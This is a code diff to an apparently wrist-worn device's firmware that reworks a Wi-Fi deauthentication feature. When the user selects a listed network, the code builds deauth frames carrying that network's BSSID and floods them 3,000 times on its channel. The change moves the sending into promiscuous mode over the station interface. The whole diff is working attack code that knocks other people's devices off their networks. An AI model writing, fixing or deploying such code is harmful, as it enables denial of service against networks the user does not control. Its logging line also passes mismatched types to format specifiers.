@@ -199,8 +199,6 @@ void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event ) {
         case( LV_EVENT_CLICKED ):   if( lv_switch_get_state( deauth_onoff ) ){
                                     int b = (lv_list_get_btn_index(NULL, obj));
 
-                                    WiFi.scanNetworks();
-
                                     String ssid;
                                     uint8_t encryptionType;
                                     int32_t RSSI;
@@ -210,11 +208,8 @@ void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event ) {
                                     WiFi.getNetworkInfo(b, ssid, encryptionType, RSSI, BSSID, channel);
                                     log_i("SSID: %s, BSSID: %d, Channel: %d", ssid, BSSID, channel);
 
-                                    WiFi.persistent(false);
-                                    WiFi.mode(WIFI_AP);
-                                    delay (300);
-                                    WiFi.enableAP(true);
-                                    WiFi.softAP("Test", "password1234", channel, 1);
+                                    esp_wifi_set_promiscuous(true);
+                                    esp_wifi_set_channel(channel, WIFI_SECOND_CHANNEL_NONE);
 
                                     uint8_t deauth_frame[sizeof(deauth_frame_default)];
                                     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
@@ -233,16 +228,12 @@ void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event ) {
                                     deauth_frame[21]= BSSID[5];
 
                                     for(int y=0; y<1000; y++){
-                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
-                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
-                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+                                        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
+                                        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
+                                        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
                                         delay(100);
                                     }
-                                    WiFi.disconnect(true, true);
-                                    WiFi.mode(WIFI_STA);
-                                    delay(250);
-                                    WiFi.enableAP(false);
-                                    
+         
                                     wifictl_off();
                                     motor_vibe(10);
 
